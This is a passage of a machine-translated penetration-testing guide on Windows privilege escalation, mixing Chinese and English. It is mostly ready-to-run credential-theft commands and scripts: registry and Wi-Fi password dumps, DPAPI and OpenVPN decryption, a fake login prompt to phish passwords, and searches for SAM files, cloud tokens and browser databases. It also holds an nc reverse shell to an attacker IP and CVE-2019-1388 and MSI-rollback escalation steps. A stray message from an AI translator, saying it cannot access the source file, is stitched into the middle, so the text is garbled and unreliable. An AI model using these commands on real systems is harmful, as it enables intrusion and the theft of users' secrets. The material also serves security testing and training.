Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则, 创建规则, 关闭, 关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows 的 Linux 子系统 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 找到

如果获得 root user，你可以在任何端口监听（第一次使用 `nc.exe` 在端口上监听时，系统会通过 GUI 询问是否允许 `nc` 通过防火墙）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要轻松以 root 身份启动 bash，可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储用于服务器、网站和其他程序的用户凭据，这些程序可以由 **Windows** **自动登录用户**。乍一看，似乎用户可以存储他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等，以便通过浏览器自动登录。但事实并非如此。

Windows Vault 存储可被 **Windows** 用来自动登录用户的凭据，这意味着任何 **Windows application that needs credentials to access a resource**（服务器或网站）**can make use of this Credential Manager** & Windows Vault，并使用提供的凭据，而不需要用户每次输入用户名和密码。

除非应用与 Credential Manager 交互，否则我认为它们无法使用某个资源的凭据。因此，如果你的应用想使用 vault，它应该以某种方式**与 Credential Manager 通信并请求该资源的凭据**，从默认存储 vault 获取。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 的 `/savecred` 选项来使用已保存的凭据。下面的示例是通过 SMB share 调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 并提供一组凭证。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意：mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、或来自[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, typically consists of 64 bytes of random data. (It's important to note that access to this directory is restricted, preventing listing its contents via the `dir` command in CMD, though it can be listed through PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并使用适当的参数（`/pvk` 或 `/rpc`）来解密它。

**credentials files protected by the master password** 通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz 模块** `dpapi::cred` 和适当的 `/masterkey` 来解密.\

你可以使用 `sekurlsa::dpapi` 模块（如果你是 root）从 **内存** 中 **提取 许多 DPAPI** **masterkeys**。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 凭据

PowerShell 凭据通常用于脚本和自动化任务，作为方便地存储加密凭据的方式。这些凭据使用 DPAPI 保护，通常意味着只有在创建它们的同一用户和同一台计算机上才能解密。

要从包含该凭据的文件中解密一个 PS 凭据，你可以这样做：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
以及在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
你可以使用 Mimikatz `sekurlsa::dpapi` 模块从内存中 **提取许多 DPAPI masterkeys**

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**注意：要从 AppCmd.exe 恢复密码，你需要是 管理员 并在 高完整性级别 下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录。\
如果此文件存在，则可能已配置了一些 **credentials** 并且可以被 **恢复**。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在 .\
安装程序以 **SYSTEM 权限运行**, 许多容易受到 **DLL Sideloading (信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件与注册表 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH 密钥

SSH 私钥可能存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，建议检查是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中发现任何条目，它很可能是已保存的 SSH key。它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
有关此技术的更多信息请见： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行且你希望其在启动时自动运行，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个技巧不再有效。我尝试创建一些 ssh 密钥，用 `ssh-add` 添加它们并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，并且 procmon 在非对称密钥认证期间没有识别出 `dpapi.dll` 的使用。

### 无人值守文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
您也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### Cached GPP 密码

之前存在一个功能，允许通过 Group Policy Preferences (GPP) 在一组机器上部署自定义的本地管理员账户。然而，这种方法存在严重的安全缺陷。首先，存放在 SYSVOL 中的 Group Policy Objects (GPOs) 以 XML 文件形式存在，任何域用户均可访问。其次，这些 GPP 中的密码使用一个公开文档化的默认密钥以 AES256 加密，任何经过身份验证的用户都可以解密这些密码。这带来了严重风险，可能允许用户获得提升的特权。

为缓解该风险，开发了一个函数来扫描本地缓存的 GPP 文件，查找包含非空 "cpassword" 字段的文件。找到此类文件后，该函数会解密密码并返回一个自定义的 PowerShell 对象。该对象包含有关 GPP 及其文件位置的详细信息，有助于识别和修复该安全漏洞。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（早于 Windows Vista）_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
带有凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭证
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求 credentials

如果你认为他可能知道，你可以随时**要求用户输入他的 credentials，甚至其他用户的 credentials**（注意直接向客户端**询问** **credentials** 非常**危险**）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭据的文件名**

已知的一些文件曾经包含以**明文**或**Base64**形式的**密码**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
我无法访问你的仓库文件。请粘贴 src/windows-hardening/windows-local-privilege-escalation/README.md 的内容，或列出你要我搜索/翻译的具体文件路径；我拿到内容后会将其中的英文翻译为中文，并保持原有的 Markdown/HTML 语法、标签与链接不变。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭证

你也应检查回收站以查找其中的凭证

要 **恢复由多个程序保存的密码** 可以使用: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 在注册表中

**其他可能包含凭证的注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史

你应该检查存放 **Chrome or Firefox** 密码的数据库 (dbs)。\
同时检查浏览器的历史记录、书签和收藏夹，可能有些 **passwords are** 存储在那里。

从浏览器提取密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 覆盖**

Component Object Model (COM) 是 Windows 操作系统内置的一项技术，允许不同语言的软件组件之间进行互通。每个 COM 组件通过 class ID (CLSID) 标识，每个组件通过一个或多个接口暴露功能，这些接口由 interface IDs (IIDs) 标识。

COM 类和接口在注册表的 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface** 下定义。该注册表是通过合并 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** 创建的。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be Apartment (Single-Threaded), Free (Multi-Threaded), Both (Single or Multi) or Neutral (Thread Neutral).

![](<../../images/image (729).png>)

基本上，如果你能覆盖将被执行的任意 DLL，并且该 DLL 将由不同用户执行，就可能实现 **escalate privileges**。

要了解攻击者如何将 COM Hijacking 用作持久化机制，请查看：


{{#ref}}
com-hijacking.md
{{#endref}}

### **在文件和注册表中搜索通用密码**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 用于搜索 passwords 的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf** 插件，我创建这个插件来在受害者系统上 **自动执行每个用于搜索 credentials 的 metasploit POST module**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索本页提到的所有包含 passwords 的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取 password 的优秀工具。

该工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 搜索多个将这些数据以明文保存的工具的 **sessions**、**usernames** 和 **passwords**（PuTTY, WinSCP, FileZilla, SuperPuTTY, 和 RDP）
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
然后，如果你对该低权限进程拥有 **full access**，你可以抓取使用 `OpenProcess()` 打开的对有特权进程的 **open handle** 并 **inject a shellcode**。\
[阅读此示例以获取有关 **如何检测和利用该漏洞** 的更多信息。](leaked-handle-exploitation.md)\
[阅读这篇**更完整的文章，解释如何测试和滥用继承了不同权限级别（不仅仅是 full access）的进程和线程的更多 open handlers**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. 识别一个通过 pipe 与之通信且你可以模仿的 **privileged process**，在该进程与你建立的 pipe 交互时，你就有机会通过采用该进程的身份来 **gain higher privileges**。有关执行此类攻击的说明，请参见[**这里**](named-pipe-client-impersonation.md)和[**这里**](#from-high-integrity-to-system)。

此外，下面的工具允许使用类似 burp 的工具**拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而另一个工具允许列出并查看所有 pipes 以寻找 privescs：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## 杂项

### 可能在 Windows 上执行代码的文件扩展名

查看页面 **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

当以用户身份获得一个 shell 时，可能存在计划任务或其他正在执行的进程会**在 command line 上传递凭据**。下面的脚本每两秒捕获一次进程的 command line，并将当前状态与上一次状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程窃取密码

## 从低权限用户提升到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过 console 或 RDP），且 UAC 已启用，在某些 Microsoft Windows 版本中，非特权用户可以运行终端或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以利用同一漏洞同时提升权限并 bypass UAC。此外，无需安装任何东西，过程中使用的 binary 已由 Microsoft 签名并发布。

受影响的一些系统包括：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You can在以下 GitHub 仓库找到所有必要的文件和信息：

https://github.com/jas502n/CVE-2019-1388

## 从 Administrator 的 Medium 到 High 完整性级别 / UAC Bypass

阅读此文以**了解完整性级别（Integrity Levels）**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后**阅读此文以了解 UAC 和 UAC bypass：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

该技术在 [**这篇博文**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 中有描述，利用代码 [**可在此获取**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中用恶意文件替换合法文件。为此，攻击者需要创建一个**恶意 MSI 安装包**，用于劫持 `C:\Config.Msi` 文件夹，该文件夹随后会被 Windows Installer 在卸载其他 MSI 包时用于存放 rollback 文件，而这些 rollback 文件会被修改为包含恶意负载。

该技术总结如下：

1. Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)

- Step 1: Install the MSI
- 创建一个会在可写文件夹（`TARGETDIR`）中安装无害文件（例如 `dummy.txt`）的 `.msi`。
- 将安装程序标记为 **"UAC Compliant"**，以便**非管理员用户**可以运行它。
- 在安装后保持对该文件的一个 **handle** 打开。

- Step 2: Begin Uninstall
- 卸载相同的 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi` 并将其重命名为 `.rbf` 文件（rollback 备份）。
- 使用 `GetFinalPathNameByHandle` **轮询打开的文件句柄**，以检测该文件何时变为 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- 该 `.msi` 包含一个**自定义卸载动作（`SyncOnRbfWritten`）**，其：
- 在 `.rbf` 被写入时发出信号。
- 然后在继续卸载之前**等待**另一个事件。

- Step 4: Block Deletion of `.rbf`
- 当接收到信号时，**以不带 `FILE_SHARE_DELETE` 的方式打开 `.rbf` 文件**——这会**阻止其被删除**。
- 然后**回传信号**以便卸载可以完成。
- Windows Installer 无法删除该 `.rbf`，并且因为无法删除所有内容，**`C:\Config.Msi` 不会被移除**。

- Step 5: Manually Delete `.rbf`
- 你（攻击者）手动删除该 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 是空的**，可以被劫持。

> 此时，**触发 SYSTEM 级别的任意文件夹删除漏洞**以删除 `C:\Config.Msi`。

